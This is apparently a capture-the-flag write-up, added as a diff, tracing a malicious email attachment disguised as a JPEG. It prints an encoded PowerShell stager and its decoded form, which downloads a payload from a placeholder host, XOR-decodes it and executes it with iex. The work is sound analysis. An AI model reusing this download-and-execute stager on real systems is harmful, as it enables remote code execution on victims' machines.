@@ -1,0 +1,24 @@
+Right away: email 15 has a major red flag by file size and the emailer is outside of the company
+<161587631300.22130.2289076783625401805@oops.net>
+
+1. Look for malicious content by using binwalk
+2. Confirmed email 15 is very malicious.  Now download everything from the email and 'file' the attachments
+3. sam2.jpg is actually Powershell code! It has a few 'NOP' methods and then encodes the real danger, so just gotta decode:
+
+JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AaQBrAGgAcgBuAC4AaQBuAHYAYQBsAGkAZAAvAG0AYQB0AGUAcgBpAGEAbAAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADIAMAA1AAoACgAkAGQAZQBjACAAPQAgACQAKABmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABiAHkAdABlAHMALgBsAGUAbgBnAHQAaAA7ACAAJABpACsAKwApACAAewAKACAAIAAgACAAJABwAHIAZQB2ACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAHAAcgBlAHYACgAgACAAIAAgACQAcAByAGUAdgAKAH0AKQAKAAoAaQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGQAZQBjACkAKQAKAA==
+
+4. Threw it into CyberChef and got the following powershell script which we need to decode again:
+
+$bytes = (New-Object Net.WebClient).DownloadData('http://ikhrn.invalid/material')
+
+$prev = [byte] 205
+
+$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
+    $prev = $bytes[$i] -bxor $prev
+    $prev
+})
+
+iex([System.Text.Encoding]::UTF8.GetString($dec))
+
+5. Took the bytes from the GET request payload the Task 1 packet capture, then decoded that content and saved the decoded program locally.
+6. Convert the decoded bytes back to UTF 8 to find the original script
